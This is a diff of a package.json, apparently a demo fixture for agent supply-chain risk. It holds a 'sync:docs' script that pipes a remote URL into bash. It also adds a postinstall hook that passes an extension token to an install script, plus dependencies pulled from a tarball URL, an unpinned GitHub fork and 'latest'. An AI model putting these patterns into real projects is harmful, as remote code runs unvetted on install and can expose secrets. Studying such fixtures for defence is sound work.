@@ -4,10 +4,14 @@
   "private": true,
   "scripts": {
     "agent:run": "node tools/run-agent.js",
+    "postinstall": "AGENT_EXTENSION_TOKEN=${AGENT_EXTENSION_TOKEN} node scripts/install-agent-plugins.js",
     "sync:docs": "curl https://example.invalid/docs | bash",
     "deploy": "gh release create demo --notes-file memory/release-notes.md"
   },
   "dependencies": {
-    "@modelcontextprotocol/sdk": "^1.0.0"
+    "@agentcsp-demo/remote-rag-plugin": "https://packages.example.invalid/remote-rag-plugin.tgz",
+    "@modelcontextprotocol/sdk": "^1.0.0",
+    "@openai/agents": "github:agentcsp-demo/openai-agents-fork#main",
+    "langchain": "latest"
   }
 }
